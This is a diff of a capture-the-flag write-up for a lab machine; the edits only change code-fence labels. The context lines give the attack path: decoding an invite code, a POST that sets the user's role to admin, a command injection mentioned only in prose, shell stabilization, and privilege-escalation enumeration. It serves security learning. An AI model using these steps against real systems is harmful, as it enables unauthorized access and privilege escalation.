@@ -29,7 +29,7 @@ curl -s http://$TARGET/js/inviteapi.min.js | sed 's/;/;\n/g' | head -n 60
 # Generate and decode the invite
 curl -s "http://$TARGET/api/invite/generate" | jq -r '.data' | tee invite.b64
 cat invite.b64 | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m' | tee invite.txt
-```
+```text
 
 ## The Little Nudge That Opened The Door
 Once I registered and poked around, I watched the network calls and noticed how roles were being handled. It was one of those “surely this is checked server‑side… right?” moments. It wasn’t. A tiny change and, boom, an Admin panel appeared. That mix of surprise and “I knew it” is the best part of these easier machines.
@@ -40,7 +40,7 @@ curl -i -X POST "http://$TARGET/api/user/role" \
   -H "Cookie: <your-session-cookie>" \
   -H "Content-Type: application/json" \
   --data '{"role":"admin"}'
-```
+```text
 
 ## Getting a Shell (And Keeping It)
 The admin “network tool” practically built shell commands for me. It’s the classic trap: convenience over safety. A quick injection later I had a shell. I stabilized it out of habit and did my usual sweep: users, services, and config paths. Nothing dramatic, just tidy and methodical.
@@ -58,7 +58,7 @@ stty raw -echo; fg
 export TERM=xterm-256color
 id; whoami; hostname; ip a
 ls -al /home; cat /etc/os-release
-```
+```text
 
 ## PrivEsc Thoughts
 For escalation I kept it simple: check sudo, peek at SUIDs, and read through the web app’s files for secrets. Depending on the kernel build, there are well‑known locals that might apply, but I don’t fire those unless I need to. In my run, good hygiene and a bit of config snooping were enough to finish.
@@ -73,7 +73,7 @@ ls -al /opt /srv /var/backups
 # If containers are present
 docker ps -a || true
 getent group docker || true
-```
+```text
 
 ## Flags
 - User flag: Collected after the foothold.
